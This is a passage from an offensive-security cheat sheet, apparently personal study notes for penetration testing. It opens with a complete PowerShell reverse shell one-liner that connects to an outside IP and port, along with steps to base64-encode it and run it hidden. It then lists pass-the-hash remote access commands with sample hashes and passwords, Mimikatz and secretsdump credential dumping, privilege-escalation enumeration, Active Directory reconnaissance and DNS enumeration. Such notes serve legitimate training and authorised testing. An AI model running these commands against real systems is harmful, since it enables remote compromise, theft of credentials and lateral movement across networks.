</span></span><span style=display:flex><span>$Encoded_everse_shell = <span style=color:#66d9ef>[Convert]</span>::ToBase64String(<span style=color:#66d9ef>[Text.Encoding]</span>::Unicode.GetBytes($Reverse_shell))</span></span></code></pre></div></div><p>To execute base64 encoded command on Powershell use option -E:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  powershell.exe -E $Encoded_reverse_shell</span></span></code></pre></div></div></div></div><div id=outline-container-headline-29 class=outline-5><h5 id=headline-29>3.3.5.2. Encode PS One-liner</h5><div id=outline-text-headline-29 class=outline-text-5><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$Text = <span style=color:#e6db74>&#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;192.168.1.218&#34;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$Bytes = <span style=color:#66d9ef>[System.Text.Encoding]</span>::Unicode.GetBytes($Text)
</span></span><span style=display:flex><span>$EncodedText =<span style=color:#66d9ef>[Convert]</span>::ToBase64String($Bytes)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$EncodedText</span></span></code></pre></div></div></div></div></div></div><div id=outline-container-headline-30 class=outline-4><h4 id=headline-30>3.3.6. Port Scanning</h4><div id=outline-text-headline-30 class=outline-text-4><p>The <code class=verbatim>Test-NetConnection</code> function checks if an IP responds to ICMP and whether a specified TCP port on the target host is open. Verify if the SMB port 445 is open on 192.168.5.151:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Test-NetConnection -Port 445 192.168.5.151</span></span></code></pre></div></div><p>We can also check for open port by initiating TCP connection as <code class=verbatim>Test-NetConnection</code> send additional traffic that is non needed for our purposes:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(<span style=color:#e6db74>&#34;192.168.5.151&#34;</span>, $_)) <span style=color:#e6db74>&#34;TCP port $_ is open&#34;</span>} 2&gt;$null</span></span></code></pre></div></div><p>We start by piping the first 1024 integer into a for-loop which assigns the incremental integer value to the <code class=verbatim>$_</code> variable. Then, we create a <code class=verbatim>Net.Sockets.TcpClient</code> object and perform a TCP connection against the target IP on port specified by <code class=verbatim>$_</code> variable, and if the connection is successful, it prompts a message that includes the open TCP port.</p></div></div></div></div></div></div><div id=outline-container-headline-31 class=outline-2><h2 id=headline-31>4. Remote Shell on Windows</h2><div id=outline-text-headline-31 class=outline-text-2><div id=outline-container-headline-32 class=outline-3><h3 id=headline-32>4.1. Impacket-wmiexec</h3><div id=outline-text-headline-32 class=outline-text-3><p>Remote into the machine using NTLM hash:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  impacket-wmiexec -hashes 00000000000000000000000000000000:7a38430ea6f0027ee955abed1762964b Administrator@192.168.40.222</span></span></code></pre></div></div></div></div><div id=outline-container-headline-33 class=outline-3><h3 id=headline-33>4.2. Impacket-psexec</h3><div id=outline-text-headline-33 class=outline-text-3><p>Remote into the machine using NTLM hash:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.221.212</span></span></code></pre></div></div><p>Remote into the machine using password:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  impacket-psexec tech/vimshi:<span style=color:#e6db74>&#34;Salesroom!&#34;</span>@172.16.189.42</span></span></code></pre></div></div><ul><li><code class=verbatim>tech/vimshi</code> Username</li><li><code class=verbatim>"Salesroom!"</code> Password</li><li><code class=verbatim>172.16.189.42</code> Host IP</li></ul></div></div><div id=outline-container-headline-34 class=outline-3><h3 id=headline-34>4.3. Evil-winrm</h3><div id=outline-text-headline-34 class=outline-text-3><p>Remote into the machine using user's credentials who is members of <code class=verbatim>Remote Management Users</code>:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  evil-winrm -i 192.168.20.220 -u admin -p <span style=color:#e6db74>&#34;qwertQwertqwert42\!\!&#34;</span></span></span></code></pre></div></div><ul><li><code class=verbatim>-u</code> Username</li><li><code class=verbatim>-p</code> Password escaped both "!" character using <code class=verbatim>\</code> character.</li></ul></div></div><div id=outline-container-headline-35 class=outline-3><h3 id=headline-35>4.4. Enter-PSSession</h3><div id=outline-text-headline-35 class=outline-text-3><p>If we have credentials of a user who is members of <code class=verbatim>Remote Management Users</code> then we can use <code class=verbatim>Enter-PSSession</code> PowerShell cmdlet.</p></div></div><div id=outline-container-headline-36 class=outline-3><h3 id=headline-36>4.5. Pywinrm</h3><div id=outline-text-headline-36 class=outline-text-3><p>If we have credentials of a user who is members of <code class=verbatim>Remote Management Users</code> then we can use <code>pywinrm</code> to remote into the machine.</p><p>Download the <code>pywinrm</code> package using <code class=verbatim>pip</code>:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo pip install pywinrm</span></span></code></pre></div></div><p>Create a script using functions define in <code>pywinrm</code> package:</p><div class="src src-python"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> winrm
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> winrm<span style=color:#f92672>.</span>Session(<span style=color:#e6db74>&#39;&lt;IPorHost&gt;&#39;</span>, auth<span style=color:#f92672>=</span>(<span style=color:#e6db74>&#39;administrator&#39;</span>,<span style=color:#e6db74>&#39;&lt;password here&gt;&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># execute &#34;hostname&#34; command on remote machine</span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>run_ps(<span style=color:#e6db74>&#34;hostname&#34;</span>)
</span></span><span style=display:flex><span>print(result<span style=color:#f92672>.</span>std_out)</span></span></code></pre></div></div></div></div></div></div><div id=outline-container-headline-37 class=outline-2><h2 id=headline-37>5. Passwords Extraction</h2><div id=outline-text-headline-37 class=outline-text-2><div id=outline-container-headline-38 class=outline-3><h3 id=headline-38>5.1. Mimikatz</h3><div id=outline-text-headline-38 class=outline-text-3><p>Extract passwords and hashes from all available sources:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>privilege::debug
</span></span><span style=display:flex><span>token::elevate
</span></span><span style=display:flex><span>sekurlsa::logonpasswords</span></span></code></pre></div></div><ul><li><code class=verbatim>privilege::debug</code> Enable <code>SeDebugPrivilege</code> access right.</li><li><code class=verbatim>token::elevate</code> Elevate to SYSTEM user.</li></ul><p>Extract NTLM hashes from the SAM database:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>privilege::debug
</span></span><span style=display:flex><span>lsadump::sam</span></span></code></pre></div></div><p>Extract <code>Mscache</code> <sup class=footnote-reference><a id=footnote-reference-1 href=#footnote-1>1</a></sup> from registry:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>privilege::debug
</span></span><span style=display:flex><span>lsadump::cache</span></span></code></pre></div></div><p>Export all the TGT/TGS from memory and save to disk in <code class=verbatim>kirbi</code> Mimikatz format:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>privilege::debug
</span></span><span style=display:flex><span>sekurlsa::tickets /export</span></span></code></pre></div></div><p>Retrieve Kerberos TGT using the user's NTLM hash:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>sekurlsa::pth /user:ken /domain:corp.com /ntlm:369def78d8372408bf6e93364cd93075 /run:powershell</span></span></code></pre></div></div><ul><li><code class=verbatim>/ntlm</code> NTLM hash of user <code class=verbatim>ken</code>.</li></ul><p><strong>NOTE: If we run <code class=verbatim>whoami</code> on the newly created PowerShell window, it will not display <code class=verbatim>ken</code> because the <code class=verbatim>whoami</code> utility only checks the process token and does not inspect imported Kerberos tickets.</strong></p><p>Mimikatz one liner:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>mimikatz &#34;privilege::debug&#34; &#34;token::elevate&#34; &#34;sekurlsa::logonpasswords&#34; &#34;lsadump::sam&#34; &#34;lsadump::cache&#34; &#34;exit&#34;</span></span></code></pre></div></div></div></div><div id=outline-container-headline-39 class=outline-3><h3 id=headline-39>5.2. Impacket-secretsdump</h3><div id=outline-text-headline-39 class=outline-text-3><p>Extract password hashes from SAM database file:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  impacket-secretsdump -sam SAM -system SYSTEM LOCAL</span></span></code></pre></div></div><p>Extract password hashes from <code class=verbatim>NTDS.dit</code> database file:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL</span></span></code></pre></div></div></div></div></div></div><div id=outline-container-headline-40 class=outline-2><h2 id=headline-40>6. Linux Privilege Escalation</h2><div id=outline-text-headline-40 class=outline-text-2><div id=outline-container-headline-41 class=outline-3><h3 id=headline-41>6.1. LinEnum - Linux PrivEsc</h3><div id=outline-text-headline-41 class=outline-text-3><p>Enumerate privilege escalation vectors on Linux system:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  ./LinEnum.sh</span></span></code></pre></div></div><p>Check <a href=https://github.com/rebootuser/LinEnum>README</a> file more for information.</p></div></div><div id=outline-container-headline-42 class=outline-3><h3 id=headline-42>6.2. LinPEAS - Linux PrivEsc</h3><div id=outline-text-headline-42 class=outline-text-3><p>Enumerate privilege escalation vectors on Linux system:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sh linpeas.sh</span></span></code></pre></div></div><p>Check the <a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>documentation</a> for more details.</p></div></div><div id=outline-container-headline-43 class=outline-3><h3 id=headline-43>6.3. unix-privesc-check - Linux PrivEsc</h3><div id=outline-text-headline-43 class=outline-text-3><p>Enumerate privilege escalation vectors on Linux system:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  ./unix-privesc-check</span></span></code></pre></div></div><p>Check the <a href=https://pentestmonkey.net/tools/audit/unix-privesc-check>documentation</a> for more details.</p></div></div><div id=outline-container-headline-44 class=outline-3><h3 id=headline-44>6.4. Pspy</h3><div id=outline-text-headline-44 class=outline-text-3><p><a href=https://github.com/DominicBreuker/pspy>Pspy</a> allows to monitor linux processes without root permissions.</p></div></div></div></div><div id=outline-container-headline-45 class=outline-2><h2 id=headline-45>7. Windows Enumeration</h2><div id=outline-text-headline-45 class=outline-text-2><div id=outline-container-headline-46 class=outline-3><h3 id=headline-46>7.1 NET.exe</h3><div id=outline-text-headline-46 class=outline-text-3><p>CLOSED: [2023-11-03 ven. 17:55]</p><div id=outline-container-headline-47 class=outline-4><h4 id=headline-47>7.1.1. Local user</h4><div id=outline-text-headline-47 class=outline-text-4><p>List all local users:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  net user</span></span></code></pre></div></div><p>Get information about a user (about groups that user belongs to, full name, etc):</p><div class="src src-cmd"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd><span style=display:flex><span>  net user john</span></span></code></pre></div></div><ul><li><code class=verbatim>john</code> A local user account</li></ul><p>List users in a group:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  net localgroup Users</span></span></code></pre></div></div><ul><li><code class=verbatim>Users</code> A local group</li></ul></div></div><div id=outline-container-headline-48 class=outline-4><h4 id=headline-48>7.1.2. Domain user</h4><div id=outline-text-headline-48 class=outline-text-4><p>Get information about a domain user (groups that user belongs to, full name, etc):</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  net user stevan /domain</span></span></code></pre></div></div><ul><li><code class=verbatim>stevan</code> A domain user</li></ul></div></div></div></div><div id=outline-container-headline-49 class=outline-3><h3 id=headline-49>7.2. PsLoggedon</h3><div id=outline-text-headline-49 class=outline-text-3><p>CLOSED: [2023-11-03 ven. 17:55]
The <code class=verbatim>PsLoggedOn.exe</code> tool is from <code>Sysinternals Suite</code> which enumerate logged-in in users.
This uses <code>Remote Registry</code> service to enumerate registry keys under <em>HKEY_USERS</em> to retrieve the security identifiers (SID) of logged-in users and convert the SIDs to usernames. The <code>Remote Registry</code> service must therefore be running on the target machine for PsLoggedOn to work:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\PsLoggedon.exe \\files04</span></span></code></pre></div></div></div></div><div id=outline-container-headline-50 class=outline-3><h3 id=headline-50>7.3. Windows Privilege Escalation</h3><div id=outline-text-headline-50 class=outline-text-3><p>CLOSED: [2023-11-03 ven. 18:17]</p><div id=outline-container-headline-51 class=outline-4><h4 id=headline-51>7.3.1. PowerUp</h4><div id=outline-text-headline-51 class=outline-text-4><p>PowerShell script that checks privilege escalation vectors on Windows system.</p><p>Download and import the script before using:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Import-Module .\PowerView.ps1</span></span></code></pre></div></div><p>Get detailed information about a specified service:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-ServiceDetail</span></span></code></pre></div></div><p>Enumerate services with unquoted paths:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-UnquotedService</span></span></code></pre></div></div><p>Enumerate services where the current user has write permission on the service binary:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-ModifiableServiceFile</span></span></code></pre></div></div><p>Enumerate services the current user can modify:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-ModifiableService</span></span></code></pre></div></div><p>Enumerate for DLL Hijacking:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Find-ProcessDLLHijack</span></span></code></pre></div></div><p>For more information check the <a href=https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>documentation</a>.</p></div></div><div id=outline-container-headline-52 class=outline-4><h4 id=headline-52>7.3.2. WinPEAS</h4><div id=outline-text-headline-52 class=outline-text-4><p>A tool is that enumerates for privilege escalation vectors:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\winPEAS.exe</span></span></code></pre></div></div></div></div></div></div></div></div><div id=outline-container-headline-53 class=outline-2><h2 id=headline-53>8. AD Enumeration</h2><div id=outline-text-headline-53 class=outline-text-2><div id=outline-container-headline-54 class=outline-3><h3 id=headline-54>8.1. PowerView</h3><div id=outline-text-headline-54 class=outline-text-3><p><a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>PowerView</a> is a enumeration tool for Windows (Enumerate AD groups, users, logged-in sessions, etc).</p><p>Import the PowerView script:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Import-Module .\PowerView.ps1</span></span></code></pre></div></div><p>Basic information about the domain:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-NetDomain</span></span></code></pre></div></div><p>Enumerate all domain users:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-NetUser
</span></span><span style=display:flex><span>  Get-NetUser | select cn,pwdlastset,lastlogon</span></span></code></pre></div></div><p>Enumerate all domain groups:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-NetGroup
</span></span><span style=display:flex><span>  Get-NetGroup <span style=color:#e6db74>&#34;IT Department&#34;</span> | select member</span></span></code></pre></div></div><p>Enumerates computer objects in the domain:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-NetComputer
</span></span><span style=display:flex><span>  Get-NetComputer | select operatingsystem,dnshostname</span></span></code></pre></div></div><p>Enumerate computers on which the current user has administrative privileges:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Find-LocalAdminAccess</span></span></code></pre></div></div><p>Enumerate all logged-in users on the machine:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-NetSession -ComputerName &lt;Pc_name&gt; -verbose</span></span></code></pre></div></div><p>Enumerate SPNs:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-NetUser -SPN
</span></span><span style=display:flex><span>  Get-NetUser -SPN | select samaccountname,serviceprincipalname</span></span></code></pre></div></div><p>Enumerates <code class=verbatim>Access Control Entries(ACE)</code> of an object:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Get-ObjectAcl -Identity stephanie
</span></span><span style=display:flex><span>  Get-ObjectAcl -Identity <span style=color:#e6db74>&#34;IT Department&#34;</span> | ? {$_.ActiveDirectoryRights <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;GenericAll&#34;</span>} | select SecurityIdentifier,ActiveDirectoryRights</span></span></code></pre></div></div><p>ActiveDirectoryRights : ReadProperty
SecurityIdentifier : S-1-5-21-1923370270-658905905-1781884369-553</p><p>So the <code class=verbatim>S-1-5-21-1923370270-658905905-1781884369-553</code> (RAS and IAS Servers) group has <code class=verbatim>ReadProperty</code> access rights on user <code class=verbatim>stevan</code> and this is a common configuration in AD and won't give us an attack vector.</p><p>Enumerate shares in the domain:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Find-DomainShare
</span></span><span style=display:flex><span>  Find-DomainShare -CheckShareAccess</span></span></code></pre></div></div></div></div><div id=outline-container-headline-55 class=outline-3><h3 id=headline-55>8.2. SharpHound</h3><div id=outline-text-headline-55 class=outline-text-3><p><code>SharpHound</code> is a data collector for <code>BloodHound</code>. It is written in C# and uses native Windows API functions and LDAP namespace functions (like <em>NetWkstaUserEnum</em> and <em>NetSessionEnum</em>) to collect data from domain controllers and domain-joined Windows systems:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Import-Module .\Sharphound.ps1
</span></span><span style=display:flex><span>  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stevan\Desktop\ -OutputPrefix <span style=color:#e6db74>&#34;testdomain&#34;</span></span></span></code></pre></div></div><ul><li><code class=verbatim>-OutputPrefix</code> Adds <code class=verbatim>testdomain</code> prefix to the name of the output file.</li></ul></div></div><div id=outline-container-headline-56 class=outline-3><h3 id=headline-56>8.3. BloodHound</h3><div id=outline-text-headline-56 class=outline-text-3><p><code>BloodHound</code> is used to analyze data collected by <code>SharpHound</code>.</p><p>List all users:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>match (u:User) return u.samaccountname</span></span></code></pre></div></div><p>Get groups with members:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>MATCH (u:User)-[:MemberOf]-&gt;(g:Group) return g.samaccountname,u.samaccountname order by g.samaccountname</span></span></code></pre></div></div><p>Get user with SPN:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>MATCH (u:User)WHERE u.hasspn=true return u.samaccountname, u.serviceprincipalnames, u.description</span></span></code></pre></div></div><p>Find user that doesnt require kerberos pre-authentication (aka AS-REP Roasting):</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>MATCH (u:User {dontreqpreauth: true}) RETURN u</span></span></code></pre></div></div><div id=outline-container-headline-57 class=outline-4><h4 id=headline-57>8.3.1. References</h4><div id=outline-text-headline-57 class=outline-text-4><ul><li><a href=https://www.whiteoaksecurity.com/blog/cypher-query-primer-bloodhound/>https://www.whiteoaksecurity.com/blog/cypher-query-primer-bloodhound/</a></li><li><a href=https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/>https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/</a></li><li><a href=https://bloodhound.readthedocs.io/en/latest/data-analysis/nodes.html#group-members>https://bloodhound.readthedocs.io/en/latest/data-analysis/nodes.html#group-members</a></li></ul></div></div></div></div></div></div><div id=outline-container-headline-58 class=outline-2><h2 id=headline-58>9. Active Information Gathering</h2><div id=outline-text-headline-58 class=outline-text-2><div id=outline-container-headline-59 class=outline-3><h3 id=headline-59>9.1. DNS Enumeration</h3><div id=outline-text-headline-59 class=outline-text-3><div id=outline-container-headline-60 class=outline-4><h4 id=headline-60>9.1.1. Host</h4><div id=outline-text-headline-60 class=outline-text-4><p>Find the IP address of www.atomicl.net:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  host www.atomicl.net</span></span></code></pre></div></div><p>By default, the host command looks for an A record, but we can also query other fields, such as MX or TXT records:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  host -t mx atomicl.net</span></span></code></pre></div></div><p>Search for name server:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  host -t ns atomicl.net</span></span></code></pre></div></div></div></div><div id=outline-container-headline-61 class=outline-4><h4 id=headline-61>9.1.2. DNSRecon</h4><div id=outline-text-headline-61 class=outline-text-4><p><code>DNSRecon</code> is an advanced DNS enumeration script written in Python:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  dnsrecon -d atomicl.net -t std</span></span></code></pre></div></div><ul><li><code class=verbatim>-d</code> option to specify a domain name.</li><li><code class=verbatim>-t</code> Type of enumeration to perform, in this case, a standard scan</li></ul><p><code>DNSRecon</code> is also capable of brute forcing subdomain using a provided word list:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  dnsrecon -d atomicl.net -D ~/wordlist.txt -t brt</span></span></code></pre></div></div><ul><li><code class=verbatim>-t brt</code> Stands for brute force</li></ul></div></div><div id=outline-container-headline-62 class=outline-4><h4 id=headline-62>9.1.3. DNSEnum</h4><div id=outline-text-headline-62 class=outline-text-4><p><code>DNSEnum</code> is another popular DNS enumeration tool that can be used to further automate DNS enumeration:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  dnsenum atomicl.net</span></span></code></pre></div></div></div></div></div></div><div id=outline-container-headline-63 class=outline-3><h3 id=headline-63>9.2. Port Scanning</h3><div id=outline-text-headline-63 class=outline-text-3><div id=outline-container-headline-64 class=outline-4><h4 id=headline-64>9.2.1. Netcat</h4><div id=outline-text-headline-64 class=outline-text-4><p>Netcat is not a port scanning tool but it can be used to do some basic port scanning.</p><div id=outline-container-headline-65 class=outline-5><h5 id=headline-65>9.2.1.1. TCP port scanning - Make three-way handshake to detect open port</h5><div id=outline-text-headline-65 class=outline-text-5><div class="src src-shell"><div class=highlight><pre tabindex=0 